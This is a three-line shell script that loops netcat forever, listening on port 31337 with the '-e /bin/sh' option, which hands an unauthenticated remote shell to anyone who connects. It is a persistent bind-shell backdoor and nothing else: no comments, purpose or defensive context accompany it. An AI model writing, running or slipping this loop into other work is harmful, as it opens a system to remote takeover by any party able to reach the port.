while [ 1 ] ; do
  netcat -l -p 31337 -vv -t -e /bin/sh
done
